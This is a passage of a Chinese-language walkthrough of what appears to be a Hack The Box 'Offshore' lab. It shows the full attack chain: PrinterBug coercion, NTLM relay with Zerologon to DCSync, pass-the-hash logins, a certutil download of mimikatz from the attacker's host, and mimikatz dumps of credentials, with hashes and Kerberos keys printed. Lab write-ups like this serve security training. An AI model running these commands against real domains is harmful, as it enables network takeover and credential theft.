[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

[https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)

使用 **Dementor（MS-RPRN PrinterBug）**：

```plain
┌──(kali㉿kali)-[~/Desktop/tools/CVE-2020-1472]
└─$ while true
do
proxychains -q python2 dementor.py \
-d LAB.OFFSHORE.LOCAL \
-u joe \
-p 'Dev0ftheyear!' \
10.10.16.2 \
172.16.1.220
sleep 2
done
```

参数解释：

```plain
10.10.16.2  → 攻击者IP
172.16.1.220  → 被诱导认证的机器
```

Dementor 做的事情：

```plain
触发 PrinterBug
↓
SRV01 向攻击者 SMB 认证
```

---

#### 第三步：NTLM Relay + Zerologon
当 SRV01 认证时：

```plain
SRV01 → attacker SMB
```

ntlmrelayx 会：

```plain
捕获 NTLM
↓
Relay 到 DC0
↓
利用 Zerologon 绕过 Netlogon
↓
执行 DCSync
```

终端会出现：

```plain
[*] (SMB): Connection from 10.10.110.3 controlled, but there are no more targets left!
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:30ac45b0c7b323178bca5ef51bd2216e:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:7bdeef07937a2a2cdb6dfc4796493e58da35fda184ba8191857c1fdce64ef7f3
krbtgt:aes128-cts-hmac-sha1-96:ec30c953a344851ee128167bec7e134a
krbtgt:des-cbc-md5:ea5ecb1504989bf1
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[*] All targets processed!
[*] (SMB): Connection from 10.10.110.3 controlled, but there are no more targets left!
DC0$:1000:aad3b435b51404eeaad3b435b51404ee:db3e2448fef1285f583e7acd1becc291:::
[*] Kerberos keys grabbed
DC0$:aes256-cts-hmac-sha1-96:4aa3d507ab5f52d7ac75946cbc764dbce903009b177965aa9d126d8cf6e9de56
DC0$:aes128-cts-hmac-sha1-96:fc889c8392b2e9fb2ce0a8bc94e40fd3
DC0$:des-cbc-md5:a286f44526ade5fd
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[*] All targets processed!
[*] (SMB): Connection from 10.10.110.3 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.10.110.3 controlled, but there are no more targets left!
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f6aaf1438d78c89c4636179e3ae18ea:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:575c40111e33699575dd2e9b96e8fd7092ec8b894e796e7fbd86119d5f9dd215
Administrator:aes128-cts-hmac-sha1-96:d2d8c940a641020e4d4294afbf137e36
Administrator:des-cbc-md5:d331fd4573efeff2
```

拿到凭据Administrator/8f6aaf1438d78c89c4636179e3ae18ea

### Administrator登录
```plain
proxychains -q evil-winrm -i 172.16.1.200 -u Administrator -H 8f6aaf1438d78c89c4636179e3ae18ea
```

# 172.16.1.200(Windows)（Setp:16）
## 端口扫描
```c
export ip=172.16.1.200; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 9389
```

## Administrator登录
```plain
proxychains -q evil-winrm -i 172.16.1.200 -u Administrator -H 8f6aaf1438d78c89c4636179e3ae18ea
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
OFFSHORE{z3r0_log0n_b3_c@reful!}
```

## 信息收集
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cmd /c nltest /domain_trusts
List of domain trusts:
    0: LAB LAB.OFFSHORE.LOCAL (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

单域，不存在域信任

# 172.16.1.220(Windows)（Setp:17）
## 端口扫描
```c
export ip=172.16.1.220; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 5985
Port open 9389
```

## Administrator登录
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.1.220 -u Administrator -H 8f6aaf1438d78c89c4636179e3ae18ea

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator.LAB\Documents> 
```

## Getflag
```c
*Evil-WinRM* PS C:\Users\Administrator.LAB\Documents> type ../Desktop/flag.txt
OFFSHORE{z3r0_log0n_n0_pw_r3set!}
```

得到flag OFFSHORE{z3r0_log0n_n0_pw_r3set!}

# 172.16.2.6(Windows)（Setp:10）
## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.2.6"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3269
Port open 3389
Port open 5985
Port open 9389
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49668
Port open 49671
Port open 49676
Port open 49677
Port open 49679
Port open 49684
Port open 49699
Port open 49735
```

## 票据登录
```plain
export KRB5CCNAME=Administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec \
-k -no-pass \
-dc-ip 172.16.2.6 \
'dc02.dev.admin.offshore.com'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc02.dev.admin.offshore.com.....
[*] Found writable share ADMIN$
[*] Uploading file UhPLISLY.exe
[*] Opening SVCManager on dc02.dev.admin.offshore.com.....
[*] Creating service tjnx on dc02.dev.admin.offshore.com.....
[*] Starting service tjnx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

## Getflag
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
OFFSHORE{l@zy_adm1ns_ru1n_th3_p4rty}
```

## Mimikatz
### 下载
```plain
 C:\Users\administrator\Desktop> certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

### sekurlsa::logonpasswords
```plain
privilege::debug
mimikatz # Privilege '20' OK
 
sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 76970 (00000000:00012caa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:05 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC02$
         * Domain   : DEV
         * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
         * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
        tspkg :
        wdigest :
         * Username : DC02$
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : DC02$
         * Domain   : dev.ADMIN.OFFSHORE.COM
         * Password : bf 06 7a b5 05 85 ab f0 bf 47 08 3d a4 c3 46 50 73 bc fa 91 e8 f8 2b 07 18 ab 51 3c 1f 99 1d ee b0 ee 3c 0a 5e 34 3b 74 37 7c 8f 5e 86 5e 14 82 62 83 7b e9 bf c9 ed 00 e2 f9 90 ff 98 42 a8 82 a1 ab 2c f2 ce 7b e4 ac c4 fc ca e3 60 2d ea 56 ca b8 d3 50 8e a8 5b ab d5 9e b7 6f b6 f5 60 b0 02 41 2e 4f 57 cd 78 68 ee 9f 2b 34 45 73 06 36 bd 8b bd 21 f5 b1 81 37 90 b5 d5 44 4e e4 45 56 35 57 d6 53 3a 1a 42 7e 14 c1 9f 3a 0c f2 f2 ba 34 86 ec a1 e1 b2 2f 7a 79 b3 cf 93 c5 b5 db 8c c4 3b 08 59 21 3d 2e a8 c3 b0 6e 60 5c 8f cd 38 13 eb 85 28 f3 32 01 59 95 19 e2 4b 00 3c 09 64 8c e0 77 6c d8 02 21 35 8c 50 b1 7f 06 6d fe 14 e3 11 e6 01 5d c8 49 e6 7b e0 8e 90 25 c7 c9 c4 5c 76 b0 4c 70 60 87 7a 5f 55 d7 c0 5e 12 35 25 
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC02$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:04 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DC02$
         * Domain   : DEV
         * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
         * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
        tspkg :
        wdigest :
         * Username : DC02$
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : dc02$
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 37816 (00000000:000093b8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/7/2026 11:41:49 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : DC02$
         * Domain   : DEV
         * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
         * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 76987 (00000000:00012cbb)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:05 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC02$
         * Domain   : DEV
         * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
         * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
        tspkg :
        wdigest :
         * Username : DC02$
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : DC02$
         * Domain   : dev.ADMIN.OFFSHORE.COM
         * Password : bf 06 7a b5 05 85 ab f0 bf 47 08 3d a4 c3 46 50 73 bc fa 91 e8 f8 2b 07 18 ab 51 3c 1f 99 1d ee b0 ee 3c 0a 5e 34 3b 74 37 7c 8f 5e 86 5e 14 82 62 83 7b e9 bf c9 ed 00 e2 f9 90 ff 98 42 a8 82 a1 ab 2c f2 ce 7b e4 ac c4 fc ca e3 60 2d ea 56 ca b8 d3 50 8e a8 5b ab d5 9e b7 6f b6 f5 60 b0 02 41 2e 4f 57 cd 78 68 ee 9f 2b 34 45 73 06 36 bd 8b bd 21 f5 b1 81 37 90 b5 d5 44 4e e4 45 56 35 57 d6 53 3a 1a 42 7e 14 c1 9f 3a 0c f2 f2 ba 34 86 ec a1 e1 b2 2f 7a 79 b3 cf 93 c5 b5 db 8c c4 3b 08 59 21 3d 2e a8 c3 b0 6e 60 5c 8f cd 38 13 eb 85 28 f3 32 01 59 95 19 e2 4b 00 3c 09 64 8c e0 77 6c d8 02 21 35 8c 50 b1 7f 06 6d fe 14 e3 11 e6 01 5d c8 49 e6 7b e0 8e 90 25 c7 c9 c4 5c 76 b0 4c 70 60 87 7a 5f 55 d7 c0 5e 12 35 25 
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:05 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC02$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 3/7/2026 11:41:48 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DC02$
         * Domain   : DEV
         * Password : (null)
        kerberos :
        * Username : dc02$
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :
```

### lsadump::sam
```plain
C:\Users\Administrator\Desktop> mimikatz.exe
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

lsadump::sam
mimikatz # Domain : DC02
SysKey : 50f374409c9699fe7dd5fe709ac21830
Local SID : S-1-5-21-1357226357-348317087-3480611721

SAMKey : 449d9438dcf00926faac4104e390164f

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: c718f548c75062ada93250db208d3178

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

```

### lsadump::dcsync
```c
lsadump::dcsync /domain:dev.admin.offshore.com /all
mimikatz # [DC] 'dev.admin.offshore.com' will be the domain
[DC] 'DC02.dev.ADMIN.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'dev.admin.offshore.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dev


Object RDN           : LostAndFound


Object RDN           : Deleted Objects


Object RDN           : Users


Object RDN           : Computers


Object RDN           : System


Object RDN           : WinsockServices


Object RDN           : RpcServices


Object RDN           : FileLinks


Object RDN           : VolumeTable


Object RDN           : ObjectMoveTable


Object RDN           : Default Domain Policy


Object RDN           : AppCategories


Object RDN           : Meetings


Object RDN           : Policies


Object RDN           : User


Object RDN           : Machine


Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : User


Object RDN           : Machine


Object RDN           : RAS and IAS Servers Access Check


Object RDN           : File Replication Service


Object RDN           : Dfs-Configuration


Object RDN           : IP Security


Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}


Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}


Object RDN           : ComPartitions


Object RDN           : ComPartitionSets


Object RDN           : WMIPolicy


Object RDN           : PolicyTemplate


Object RDN           : SOM


Object RDN           : PolicyType


Object RDN           : WMIGPO


Object RDN           : DomainUpdates


Object RDN           : Operations


Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6


Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4


Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5


Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3


Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1


Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173


Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e


Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182


Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d


Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a


Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26


Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b


Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284


Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4


Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650


Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912


Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767


Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9


Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b


Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15


Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3


Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222


Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0


Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f


Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069


Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c


Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961


Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221


Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c


Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2


Object RDN           : c4f17608-e611-11d6-9793-00c04f613221


Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221


Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c


Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e


Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a


Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017


Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56


Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8


Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf


Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741


Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70


Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1


Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca


Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3


Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0


Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166


Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80


Object RDN           : b96ed344-545a-4172-aa0c-68118202f125


Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa


Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02


Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100


Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d


Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91


Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991


Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211


Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e


Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff


Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7


Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133


Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA


Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850


Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d


Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD


Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080


Object RDN           : Windows2003Update


Object RDN           : ActiveDirectoryUpdate


Object RDN           : Password Settings Container


Object RDN           : PSPs


Object RDN           : Domain Controllers


Object RDN           : Infrastructure


Object RDN           : ForeignSecurityPrincipals


Object RDN           : Program Data


Object RDN           : Microsoft


Object RDN           : NTDS Quotas


Object RDN           : Managed Service Accounts


Object RDN           : TPM Devices


Object RDN           : Keys


Object RDN           : Guest

** SAM ACCOUNT **

SAM Username         : Guest
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-501
Object Relative ID   : 501

Credentials:

Object RDN           : DefaultAccount

** SAM ACCOUNT **

SAM Username         : DefaultAccount
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-503
Object Relative ID   : 503

Credentials:

Object RDN           : Builtin


Object RDN           : S-1-5-4


Object RDN           : S-1-5-11


Object RDN           : Network Configuration Operators

** SAM ACCOUNT **

SAM Username         : Network Configuration Operators
Object Security ID   : S-1-5-32-556
Object Relative ID   : 556

Credentials:

Object RDN           : Performance Monitor Users

** SAM ACCOUNT **

SAM Username         : Performance Monitor Users
Object Security ID   : S-1-5-32-558
Object Relative ID   : 558

Credentials:

Object RDN           : Performance Log Users

** SAM ACCOUNT **

SAM Username         : Performance Log Users
Object Security ID   : S-1-5-32-559
Object Relative ID   : 559

Credentials:

Object RDN           : Distributed COM Users

** SAM ACCOUNT **

SAM Username         : Distributed COM Users
Object Security ID   : S-1-5-32-562
Object Relative ID   : 562

Credentials:

Object RDN           : S-1-5-17


Object RDN           : IIS_IUSRS

** SAM ACCOUNT **

SAM Username         : IIS_IUSRS
Object Security ID   : S-1-5-32-568
Object Relative ID   : 568

Credentials:

Object RDN           : Cryptographic Operators

** SAM ACCOUNT **

SAM Username         : Cryptographic Operators
Object Security ID   : S-1-5-32-569
Object Relative ID   : 569

Credentials:

Object RDN           : Event Log Readers

** SAM ACCOUNT **

SAM Username         : Event Log Readers
Object Security ID   : S-1-5-32-573
Object Relative ID   : 573

Credentials:

Object RDN           : Certificate Service DCOM Access

** SAM ACCOUNT **

SAM Username         : Certificate Service DCOM Access
Object Security ID   : S-1-5-32-574
Object Relative ID   : 574

Credentials:

Object RDN           : RDS Remote Access Servers

** SAM ACCOUNT **

SAM Username         : RDS Remote Access Servers
Object Security ID   : S-1-5-32-575
Object Relative ID   : 575

Credentials:

Object RDN           : RDS Endpoint Servers

** SAM ACCOUNT **

SAM Username         : RDS Endpoint Servers
Object Security ID   : S-1-5-32-576
Object Relative ID   : 576

Credentials:

Object RDN           : RDS Management Servers

** SAM ACCOUNT **

SAM Username         : RDS Management Servers
Object Security ID   : S-1-5-32-577
Object Relative ID   : 577

Credentials:

Object RDN           : Hyper-V Administrators

** SAM ACCOUNT **

SAM Username         : Hyper-V Administrators
Object Security ID   : S-1-5-32-578
Object Relative ID   : 578

Credentials:

Object RDN           : Access Control Assistance Operators

** SAM ACCOUNT **

SAM Username         : Access Control Assistance Operators
Object Security ID   : S-1-5-32-579
Object Relative ID   : 579

Credentials:

Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : System Managed Accounts Group

** SAM ACCOUNT **

SAM Username         : System Managed Accounts Group
Object Security ID   : S-1-5-32-581
Object Relative ID   : 581

Credentials:

Object RDN           : Storage Replica Administrators

** SAM ACCOUNT **

SAM Username         : Storage Replica Administrators
Object Security ID   : S-1-5-32-582
Object Relative ID   : 582

Credentials:

Object RDN           : Domain Computers

** SAM ACCOUNT **

SAM Username         : Domain Computers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-515
Object Relative ID   : 515

Credentials:

Object RDN           : Cert Publishers

** SAM ACCOUNT **

SAM Username         : Cert Publishers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-517
Object Relative ID   : 517

Credentials:

Object RDN           : Domain Users

** SAM ACCOUNT **

SAM Username         : Domain Users
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-513
Object Relative ID   : 513

Credentials:

Object RDN           : Domain Guests

** SAM ACCOUNT **

SAM Username         : Domain Guests
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-514
Object Relative ID   : 514

Credentials:

Object RDN           : RAS and IAS Servers

** SAM ACCOUNT **

SAM Username         : RAS and IAS Servers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-553
Object Relative ID   : 553

Credentials:

Object RDN           : Terminal Server License Servers

** SAM ACCOUNT **

SAM Username         : Terminal Server License Servers
Object Security ID   : S-1-5-32-561
Object Relative ID   : 561

Credentials:

Object RDN           : Users

** SAM ACCOUNT **

SAM Username         : Users
Object Security ID   : S-1-5-32-545
Object Relative ID   : 545

Credentials:

Object RDN           : Guests

** SAM ACCOUNT **

SAM Username         : Guests
Object Security ID   : S-1-5-32-546
Object Relative ID   : 546

Credentials:

Object RDN           : Group Policy Creator Owners

** SAM ACCOUNT **

SAM Username         : Group Policy Creator Owners
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-520
Object Relative ID   : 520

Credentials:

Object RDN           : Pre-Windows 2000 Compatible Access

** SAM ACCOUNT **

SAM Username         : Pre-Windows 2000 Compatible Access
Object Security ID   : S-1-5-32-554
Object Relative ID   : 554

Credentials:

Object RDN           : S-1-5-9


Object RDN           : Windows Authorization Access Group

** SAM ACCOUNT **

SAM Username         : Windows Authorization Access Group
Object Security ID   : S-1-5-32-560
Object Relative ID   : 560

Credentials:

Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22


Object RDN           : Allowed RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Allowed RODC Password Replication Group
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-571
Object Relative ID   : 571

Credentials:

Object RDN           : Cloneable Domain Controllers

** SAM ACCOUNT **

SAM Username         : Cloneable Domain Controllers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-522
Object Relative ID   : 522

Credentials:

Object RDN           : Protected Users

** SAM ACCOUNT **

SAM Username         : Protected Users
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-525
Object Relative ID   : 525

Credentials:

Object RDN           : DnsAdmins

** SAM ACCOUNT **

SAM Username         : DnsAdmins
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1101
Object Relative ID   : 1101

Credentials:

Object RDN           : DnsUpdateProxy

** SAM ACCOUNT **

SAM Username         : DnsUpdateProxy
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1102
Object Relative ID   : 1102

Credentials:

Object RDN           : MicrosoftDNS


Object RDN           : RootDNSServers


Object RDN           : @


Object RDN           : a.root-servers.net


Object RDN           : b.root-servers.net


Object RDN           : c.root-servers.net


Object RDN           : d.root-servers.net


